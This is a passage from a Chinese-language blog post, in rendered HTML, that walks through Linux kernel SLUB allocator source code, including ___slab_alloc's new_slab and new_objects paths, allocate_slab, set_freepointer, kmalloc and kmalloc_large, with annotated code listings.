持有自旋锁消除了acquire_slab()看到一个slab为冻结的可能性</span><br><span class="hljs-comment"> */</span><br>spin_lock_irqsave(&amp;n-&gt;list_lock, flags);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>mode = M_FULL_NOLIST;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (!cmpxchg_double_slab(s, slab,<br>old.freelist, old.counters,<br>new.freelist, new.counters,<br><span class="hljs-string">&quot;unfreezing slab&quot;</span>)) &#123;<br><span class="hljs-keyword">if</span> (mode == M_PARTIAL)<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (mode == M_PARTIAL) &#123;<br>add_partial(n, slab, tail);<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br>stat(s, tail);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mode == M_FREE) &#123;<br>stat(s, DEACTIVATE_EMPTY);<br>discard_slab(s, slab);<br>stat(s, FREE_SLAB);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mode == M_FULL_NOLIST) &#123;<br>stat(s, DEACTIVATE_FULL);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="④-new-slab：获取-percpu-partial-slab"><a href="#④-new-slab：获取-percpu-partial-slab" class="headerlink" title="④ new_slab：获取 percpu partial slab"></a>④ new_slab：获取 percpu partial slab</h4><p>接下来是 <code>new_slab</code> 标签，主要就是检查若有 percpu partial slab 则从 percpu partial 链表上获取一个 slab 将其设为 percpu slab 后 再跳转回 <code>redo</code> 标签：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">new_slab:<br><br><span class="hljs-keyword">if</span> (slub_percpu_partial(c)) &#123;<span class="hljs-comment">//有 percpu partial slab</span><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (unlikely(c-&gt;slab)) &#123;<span class="hljs-comment">//percpu slab 不为空，直接跳回 redo</span><br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">goto</span> reread_slab;<br>&#125;<br><span class="hljs-keyword">if</span> (unlikely(!slub_percpu_partial(c))) &#123;<span class="hljs-comment">//被抢占然后partial空了</span><br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-comment">/* 我们被抢占了且 partial 链表空了 */</span><br><span class="hljs-keyword">goto</span> new_objects;<br>&#125;<br><br><span class="hljs-comment">// 获取一张 percpu patial slab，跳回 redo</span><br>slab = c-&gt;slab = slub_percpu_partial(c);<br>slub_set_percpu_partial(c, slab);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br>stat(s, CPU_PARTIAL_ALLOC);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="⑤-new-objects：获取-node-pertial-slab-或向-buddy-请求新-slab-进行分配"><a href="#⑤-new-objects：获取-node-pertial-slab-或向-buddy-请求新-slab-进行分配" class="headerlink" title="⑤ new_objects：获取 node pertial slab 或向 buddy 请求新 slab 进行分配"></a>⑤ new_objects：获取 node pertial slab 或向 buddy 请求新 slab 进行分配</h4><p>若 percpu partial 链表也为空，那么便来到接下来的 <code>new_objects</code> 标签分配一个新的 slab，首先会设置 <code>partial_context</code>，调用 <code>get_partial()</code> 尝试从 <code>kmem_cache_node</code> 的 partial 链表分配一个 slab，若分配成功则直接跳转到 <code>check_new_slab</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">new_objects:<br><br>pc.flags = gfpflags;<br>pc.slab = &amp;slab;<br>pc.orig_size = orig_size;<br>freelist = get_partial(s, node, &amp;pc);<br><span class="hljs-keyword">if</span> (freelist)<br><span class="hljs-keyword">goto</span> check_new_slab;<br><br></code></pre></td></tr></table></figure><p><code>get_partial()</code> 首先会调用 <code>get_partial_node()</code> 从当前 node 的 <code>kmem_cache_node</code> 的 partial 链表分配 slab，若成功了则直接返回，如果失败了但是指定了分配的 node 为 <code>NUMA_NO_NODE</code>，则调用 <code>get_any_partial()</code> 从其他的 <code>kmem_cache_node</code> 的 partial 链表尝试分配：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 获取一个 partial slab, 加锁并返回.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">get_partial</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">int</span> node, <span class="hljs-keyword">struct</span> partial_context *pc)</span><br>&#123;<br><span class="hljs-type">void</span> *object;<br><span class="hljs-type">int</span> searchnode = node;<br><br><span class="hljs-keyword">if</span> (node == NUMA_NO_NODE)<br>searchnode = numa_mem_id();<br><br><span class="hljs-comment">// 从当前 node 的 partial 链表分配 slab</span><br>object = get_partial_node(s, get_node(s, searchnode), pc);<br><span class="hljs-keyword">if</span> (object || node != NUMA_NO_NODE)<br><span class="hljs-keyword">return</span> object;<br><br><span class="hljs-comment">// 从其他 node 的 partial 链表分配 slab</span><br><span class="hljs-keyword">return</span> get_any_partial(s, pc);<br>&#125;<br></code></pre></td></tr></table></figure><p>若 <code>get_partial()</code> 没法获取到 slab，则调用 <code>new_slab()</code> 向 buddy system 请求一份新的 slab，若失败了则直接返回：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">slub_put_cpu_ptr(s-&gt;cpu_slab);<br>slab = new_slab(s, gfpflags, node);<br>c = slub_get_cpu_ptr(s-&gt;cpu_slab);<br><br><span class="hljs-keyword">if</span> (unlikely(!slab)) &#123;<br>slab_out_of_memory(s, gfpflags, node);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>stat(s, ALLOC_SLAB);<br></code></pre></td></tr></table></figure><p><code>new_slab()</code> 最后会调用到 <code>allocate_slab()</code>：</p><ul><li>首先检查页面分配标志位，之后调用 <code>alloc_slab_page()</code> 在指定 node 上进行分配<ul><li>若 <code>node == NUMA_NO_NODE</code>，则该函数会调用 <code>alloc_pages()</code>，否则会调用 <code>__alloc_pages_node()</code></li></ul></li><li>若失败了则再次调用  <code>alloc_slab_page()</code>  尝试进行最小内存分配（<code>kmem_cache-&gt;min</code>），仍失败则直接返回 NULL</li><li>初始化 slab 各成员，并调用 <code>shuffle_freelist()</code> 为空闲对象构造随机化链表，若未开启随机化则将空闲对象按顺序连接</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> slab *<span class="hljs-title function_">allocate_slab</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> flags, <span class="hljs-type">int</span> node)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">oo</span> =</span> s-&gt;oo;<br><span class="hljs-type">gfp_t</span> alloc_gfp;<br><span class="hljs-type">void</span> *start, *p, *next;<br><span class="hljs-type">int</span> idx;<br><span class="hljs-type">bool</span> shuffle;<br><br>flags &amp;= gfp_allowed_mask;<br><br>flags |= s-&gt;allocflags;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 让最初的 higher-order 分配在内存压力下失败</span><br><span class="hljs-comment"> * 由此我们返回到最小 order 的分配.</span><br><span class="hljs-comment"> */</span><br>alloc_gfp = (flags | __GFP_NOWARN | __GFP_NORETRY) &amp; ~__GFP_NOFAIL;<br><span class="hljs-keyword">if</span> ((alloc_gfp &amp; __GFP_DIRECT_RECLAIM) &amp;&amp; oo_order(oo) &gt; oo_order(s-&gt;min))<br>alloc_gfp = (alloc_gfp | __GFP_NOMEMALLOC) &amp; ~__GFP_RECLAIM;<br><br>slab = alloc_slab_page(alloc_gfp, node, oo);<br><span class="hljs-keyword">if</span> (unlikely(!slab)) &#123;<span class="hljs-comment">//分配失败，尝试最小内存分配</span><br>oo = s-&gt;min;<br>alloc_gfp = flags;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 分配可能因为碎片化而失败.</span><br><span class="hljs-comment"> * 可能的话尝试一个 lower order 的分配</span><br><span class="hljs-comment"> */</span><br>slab = alloc_slab_page(alloc_gfp, node, oo);<br><span class="hljs-keyword">if</span> (unlikely(!slab))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>stat(s, ORDER_FALLBACK);<br>&#125;<br><br>slab-&gt;objects = oo_objects(oo);<br>slab-&gt;inuse = <span class="hljs-number">0</span>;<br>slab-&gt;frozen = <span class="hljs-number">0</span>;<br><br>account_slab(slab, oo_order(oo), s, flags);<br><br>slab-&gt;slab_cache = s;<br><br>kasan_poison_slab(slab);<br><br>start = slab_address(slab);<br><br>setup_slab_debug(s, slab, start);<br><br><span class="hljs-comment">//开启了随机化会在该函数内随机连接</span><br>shuffle = shuffle_freelist(s, slab);<br><br><span class="hljs-comment">//未开启随机化，按顺序连接</span><br><span class="hljs-keyword">if</span> (!shuffle) &#123;<br>start = fixup_red_left(s, start);<br>start = setup_object(s, start);<br>slab-&gt;freelist = start;<br><span class="hljs-keyword">for</span> (idx = <span class="hljs-number">0</span>, p = start; idx &lt; slab-&gt;objects - <span class="hljs-number">1</span>; idx++) &#123;<br>next = p + s-&gt;size;<br>next = setup_object(s, next);<br>set_freepointer(s, p, next);<br>p = next;<br>&#125;<br>set_freepointer(s, p, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-keyword">return</span> slab;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里用了一个函数 <code>set_freepointer()</code>，主要就是用 <code>freelist_ptr()</code> 向 <code>object + s-&gt;offset</code> 的位置写入用 <code>freelist_ptr()</code> 加密后的 <code>fp</code> 指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">set_freepointer</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">void</span> *object, <span class="hljs-type">void</span> *fp)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> freeptr_addr = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)object + s-&gt;offset;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span><br>BUG_ON(object == fp); <span class="hljs-comment">/* naive detection of double free or corruption */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>freeptr_addr = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)kasan_reset_tag((<span class="hljs-type">void</span> *)freeptr_addr);<br>*(<span class="hljs-type">void</span> **)freeptr_addr = freelist_ptr(s, fp, freeptr_addr);<br>&#125;<br></code></pre></td></tr></table></figure><p>返回 <code>___slab_alloc()</code>，如果<strong>该 kmem_cache 设置了 <code>SLAB_DEBUG_FLAGS</code> 标志位</strong>，则接下来会调用 <code>alloc_single_from_new_slab()</code> <strong>从新获取到的 slab 上分配一个对象后将 slab 重新挂回 partial&#x2F;full 链表</strong>，若分配失败则跳转回 <code>new_objects</code>，成功则直接返回</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (kmem_cache_debug(s)) &#123;<br>freelist = alloc_single_from_new_slab(s, slab, orig_size);<br><br><span class="hljs-keyword">if</span> (unlikely(!freelist))<br><span class="hljs-keyword">goto</span> new_objects;<br><br><span class="hljs-keyword">if</span> (s-&gt;flags &amp; SLAB_STORE_USER)<br>set_track(s, freelist, TRACK_ALLOC, addr);<br><br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果没有设置 <code>SLAB_DEBUG_FLAGS</code> 标志位，则接下来获取 slab 的 freelist，并调用 <code>inc_slabs_node()</code> 增加 node 上的计数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * No other reference to the slab yet so we can</span><br><span class="hljs-comment"> * muck around with it freely without cmpxchg</span><br><span class="hljs-comment"> */</span><br>freelist = slab-&gt;freelist;<br>slab-&gt;freelist = <span class="hljs-literal">NULL</span>;<br>slab-&gt;inuse = slab-&gt;objects;<br>slab-&gt;frozen = <span class="hljs-number">1</span>;<br><br>inc_slabs_node(s, slab_nid(slab), slab-&gt;objects);<br></code></pre></td></tr></table></figure><h4 id="⑥-check-new-slab：检查-slab"><a href="#⑥-check-new-slab：检查-slab" class="headerlink" title="⑥ check_new_slab：检查 slab"></a>⑥ check_new_slab：检查 slab</h4><p>接下来对新获取的 slab 进行检查，若该 kmem_cache 设置了 <code>SLAB_DEBUG_FLAGS</code> 标志位，检查是否设置了 <code>SLAB_STORE_USER</code> 标志位，之后直接返回 freelist</p><p>接下来调用 <code>pfmemalloc_match()</code> 检查 slab 与分配标志位是否不匹配，若是则调用 <code>deactivate_slab()</code> 使其不再活动并返回 freelist</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">check_new_slab:<br><br><span class="hljs-keyword">if</span> (kmem_cache_debug(s)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * For debug caches here we had to go through</span><br><span class="hljs-comment"> * alloc_single_from_partial() so just store the tracking info</span><br><span class="hljs-comment"> * and return the object</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (s-&gt;flags &amp; SLAB_STORE_USER)<br>set_track(s, freelist, TRACK_ALLOC, addr);<br><br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br><br><span class="hljs-keyword">if</span> (unlikely(!pfmemalloc_match(slab, gfpflags))) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * For !pfmemalloc_match() case we don&#x27;t load freelist so that</span><br><span class="hljs-comment"> * we don&#x27;t make further mismatched allocations easier.</span><br><span class="hljs-comment"> */</span><br>deactivate_slab(s, slab, get_freepointer(s, freelist));<br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="⑦-retry-load-slab："><a href="#⑦-retry-load-slab：" class="headerlink" title="⑦ retry_load_slab："></a>⑦ retry_load_slab：</h4><p>最后就是尝试加载新获得的 slab，如果 percpu slab 不为 NULL 则使其不再活动，并设置 percpu slab &amp; freelist 为 NULL，并获取下一个 tid</p><p>最后就是将 percpu slab 设为新获取的 slab 并跳转回 <code>load_freelist</code> 分配对象并返回</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">retry_load_slab:<br><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (unlikely(c-&gt;slab)) &#123;<br><span class="hljs-type">void</span> *flush_freelist = c-&gt;freelist;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">flush_slab</span> =</span> c-&gt;slab;<br><br>c-&gt;slab = <span class="hljs-literal">NULL</span>;<br>c-&gt;freelist = <span class="hljs-literal">NULL</span>;<br>c-&gt;tid = next_tid(c-&gt;tid);<br><br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><br>deactivate_slab(s, flush_slab, flush_freelist);<br><br>stat(s, CPUSLAB_FLUSH);<br><br><span class="hljs-keyword">goto</span> retry_load_slab;<br>&#125;<br>c-&gt;slab = slab;<br><br><span class="hljs-keyword">goto</span> load_freelist;<br>&#125;<br></code></pre></td></tr></table></figure><p>至此， slub 分配算法的核心逻辑分析结束</p><h2 id="二、kmalloc：-NUMA-NO-NODE-的通用上层分配接口"><a href="#二、kmalloc：-NUMA-NO-NODE-的通用上层分配接口" class="headerlink" title="二、kmalloc： NUMA_NO_NODE 的通用上层分配接口"></a>二、kmalloc： NUMA_NO_NODE 的通用上层分配接口</h2><p>我们日常生活中（？）最常用的其实还是 <code>kmalloc()</code>，其会根据分配的大小与标志位帮我们完成 <code>kmem_cache</code> 的选取并进行对象分配</p><p>函数整体逻辑比较简单：</p><ul><li>若分配的大小在编译期已知（<code>__builtin_constant_p()</code>）则判断大小：<ul><li>若大小大于 <code>KMALLOC_MAX_CACHE_SIZE</code> 则使用 <code>kmalloc_large()</code> 进行分配</li><li>通过 <code>kmalloc_index()</code> 与 <code>kmalloc_type()</code> 获取 <code>kmalloc_caches</code> 中对应的数组下标并调用 <code>kmalloc_trace</code> 进行对象分配</li></ul></li><li>若大小是动态传入的，调用 <code>__kmalloc()</code> 进行分配</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * kmalloc - 分配内核内存</span><br><span class="hljs-comment"> * @size: 需要的内存字节数.</span><br><span class="hljs-comment"> * @flags: 描述分配上下文</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * kmalloc 是内核中分配小于页面大小的内存对象的通用方法.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 被分配的对象地址至少要对齐到 ARCH_KMALLOC_MINALIGN 字节.</span><br><span class="hljs-comment"> * 对于 2^n 字节的 @size , 对齐也需要保证至少到该大小.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @flags argument 可能是 include/linux/gfp.h 中定义的GFP 标志位，描述于</span><br><span class="hljs-comment"> * :ref:`Documentation/core-api/mm-api.rst &lt;mm-api-gfp-flags&gt;`</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 推荐的对 @flags 使用描述于</span><br><span class="hljs-comment"> * :ref:`Documentation/core-api/memory-allocation.rst &lt;memory_allocation&gt;`</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 以下为最常用的 GFP 标志位简要概述</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %GFP_KERNEL</span><br><span class="hljs-comment"> *分配普通内核内存. 可能睡眠.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %GFP_NOWAIT</span><br><span class="hljs-comment"> *分配将不会睡眠.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %GFP_ATOMIC</span><br><span class="hljs-comment"> *分配将不会睡眠.  可能使用 emergency pools.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 也可以通过异或以下的一个或多个额外@flags来设置不同的标志位:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_ZERO</span><br><span class="hljs-comment"> *在返回前清零分配的内存. 也可参见 kzalloc().</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_HIGH</span><br><span class="hljs-comment"> *这个分配有着高优先级且可能使用 emergency pools.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_NOFAIL</span><br><span class="hljs-comment"> *表示此次分配不允许失败</span><br><span class="hljs-comment"> *(在使用前再次思考).</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_NORETRY</span><br><span class="hljs-comment"> *若内存不会马上可用,立即放弃.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_NOWARN</span><br><span class="hljs-comment"> *若分配失败，不要提交警告.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_RETRY_MAYFAIL</span><br><span class="hljs-comment"> *努力尝试使分配成功，但最终失败.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_SLOB</span><br><span class="hljs-type">static</span> __always_inline __alloc_size(<span class="hljs-number">1</span>) <span class="hljs-type">void</span> *<span class="hljs-title function_">kmalloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-keyword">if</span> (__builtin_constant_p(size) &amp;&amp; size) &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index;<br><br><span class="hljs-keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE)<br><span class="hljs-keyword">return</span> kmalloc_large(size, flags);<br><br>index = kmalloc_index(size);<br><span class="hljs-keyword">return</span> kmalloc_trace(<br>kmalloc_caches[kmalloc_type(flags)][index],<br>flags, size);<br>&#125;<br><span class="hljs-keyword">return</span> __kmalloc(size, flags);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="I-kmalloc-large-：直接向-buddy-system-请求内存"><a href="#I-kmalloc-large-：直接向-buddy-system-请求内存" class="headerlink" title="I. kmalloc_large()：直接向 buddy system 请求内存"></a>I. kmalloc_large()：直接向 buddy system 请求内存</h3><p>对于请求大小大于 <code>KMALLOC_MAX_CACHE_SIZE</code> 的内存分配请求而言， <code>kmalloc()</code> 会直接调用 <code>kmalloc_large()</code> 完成内存分配，最后实际上会在 <code>__kmalloc_large_node()</code> 调用 <code>alloc_pages()</code> 向 buddy system 请求内存：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 为了避免不必要的开销,我们将大的分配请求直接传递给页面分配器.</span><br><span class="hljs-comment"> * 我们使用 __GFP_COMP, 因为我们需要知道分配的 order 以在 kfree 中恰当地释放.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *__kmalloc_large_node(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags, <span class="hljs-type">int</span> node)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">void</span> *ptr = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order = get_order(size);<br><br><span class="hljs-keyword">if</span> (unlikely(flags &amp; GFP_SLAB_BUG_MASK))<br>flags = kmalloc_fix_flags(flags);<br><br>flags |= __GFP_COMP;<br>page = alloc_pages_node(node, flags, order);<br><span class="hljs-keyword">if</span> (page) &#123;<br>ptr = page_address(page);<br>mod_lruvec_page_state(page, NR_SLAB_UNRECLAIMABLE_B,<br>      PAGE_SIZE &lt;&lt; order);<br>&#125;<br><br>ptr = kasan_kmalloc_large(ptr, size, flags);<br><span class="hljs-comment">/* As ptr might get tagged, call kmemleak hook after 